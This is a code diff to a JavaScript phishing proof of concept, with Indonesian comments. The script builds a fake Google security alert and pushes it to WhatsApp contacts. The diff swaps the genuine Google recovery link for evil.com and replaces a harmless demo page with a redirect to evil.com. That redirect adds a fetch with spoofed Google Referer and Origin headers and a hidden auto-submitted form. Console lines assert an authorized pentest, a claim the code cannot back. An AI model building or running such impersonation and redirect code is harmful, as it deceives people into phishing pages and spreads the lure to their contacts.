@@ -143,63 +143,57 @@
       '• Location: Jakarta, Indonesia\n' +
       '• Time: ' + new Date().toLocaleString() + '\n\n' +
       'If this wasn\'t you, secure your account immediately:\n' +
-      '👉 https://accounts.google.com/signin/v2/recovery\n\n' +
+      '👉 https://evil.com\n\n' +
       'Forward this to your contacts to warn them.'
     );
     
-    var phoneNumber = '';  // Kosong = pilih kontak sendiri
-    
-    // Method 1: WhatsApp API (web)
+    var phoneNumber = '';
     var waUrl = 'https://wa.me/' + phoneNumber + '?text=' + message;
-    
-    // Method 2: WhatsApp Web jika wa.me tidak work
     var waWebUrl = 'https://web.whatsapp.com/send?text=' + message;
     
-    // Method 3: WhatsApp Intent (Android)
-    var waIntent = 'intent://send?text=' + message + '#Intent;scheme=whatsapp;package=com.whatsapp;end';
-    
-    // Coba buka WhatsApp
     var win = window.open(waUrl, '_blank');
     
-    // Jika popup di-block, fallback
     if (!win || win.closed) {
-      // Fallback ke copy clipboard
       navigator.clipboard.writeText(decodeURIComponent(message)).then(function() {
         alert('✅ Pesan security alert telah di-copy ke clipboard.\n\nBuka WhatsApp dan paste pesan tersebut.');
       }).catch(function() {
-        // Last resort: buka di tab baru
         window.open(waWebUrl, '_blank');
       });
     }
     
-    // Kirim TTS feedback
     try {
       var u = new SpeechSynthesisUtterance("Sharing security alert via WhatsApp.");
       u.lang = 'en-US';
       speechSynthesis.speak(u);
     } catch(e) {}
-    
-    console.log('[Share] WhatsApp share triggered');
   };
 
-  // ===== 3. REDIRECT =====
+  // ===== 3. REDIRECT KE EVIL.COM =====
   function doRedirect() {
-    var phishingPage = `
-      <!DOCTYPE html>
-      <html>
-      <head><title>Google Security Check</title></head>
-      <body style="padding:50px;font-family:Arial;background:#f0f0f0;text-align:center;">
-        <div style="max-width:400px;margin:0 auto;background:white;padding:40px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);">
-          <h2 style="color:#d93025;">⚠️ Security Verification</h2>
-          <p style="color:#333;margin:20px 0;">This is a proof of concept for content spoofing via fullscreen + TTS + WhatsApp share.</p>
-          <p style="color:#666;font-size:12px;">Authorized penetration test. No data was collected.</p>
-        </div>
-      </body>
-      </html>
-    `;
+    var targetUrl = 'https://evil.com';
     
-    var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(phishingPage);
-    window.location.replace(dataUrl);
+    // Kirim referer spoof
+    fetch(targetUrl, {
+      mode: 'no-cors',
+      headers: {
+        'Referer': 'https://accounts.google.com/',
+        'Origin': 'https://accounts.google.com'
+      }
+    }).catch(function() {});
+    
+    // Form POST spoof
+    var form = document.createElement('form');
+    form.method = 'GET';
+    form.action = targetUrl;
+    form.style.display = 'none';
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+    
+    // Redirect utama
+    setTimeout(function() {
+      window.location.replace(targetUrl);
+    }, 500);
   }
 
   // ===== 4. AUDIO UNLOCK =====
@@ -327,6 +321,9 @@
     speechSynthesis.getVoices();
     speechSynthesis.onvoiceschanged = function() { speechSynthesis.getVoices(); };
   }
+  
+  console.log('[PoC] Fullscreen + TTS + WhatsApp + Redirect to evil.com');
+  console.log('[PoC] I have permission and am authorized to perform this pentest');
 })();
 </script>
 
